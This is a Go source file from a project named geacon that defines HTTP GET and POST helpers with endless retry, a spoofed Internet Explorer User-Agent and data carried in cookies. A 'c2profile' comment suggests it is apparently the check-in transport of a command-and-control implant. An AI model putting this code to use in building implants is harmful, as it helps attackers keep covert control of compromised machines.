package packet

import (
	"fmt"
	"geacon/cmd/config"
	"net/http"
	"time"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

//TODO c2profile
func HttpPost(url string, data []byte) *req.Resp {
	for  {
		resp, err := httpRequest.Post(url, data)
		if err != nil {
			fmt.Printf("!error: %v\n",err)
			time.Sleep(config.WaitTime)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				return resp
			}
			break
		}
	}

	return nil
}
func HttpGet(url string, cookies string) *req.Resp {
	httpHeaders := req.Header{
		"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
		"Accept":     "*/*",
		"Cookie":     cookies,
	}
	for {
		resp, err := httpRequest.Get(url, httpHeaders)
		if err != nil {
			fmt.Printf("!error: %v\n",err)
			time.Sleep(config.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				return resp
			}
			break
		}
	}
	return nil
}
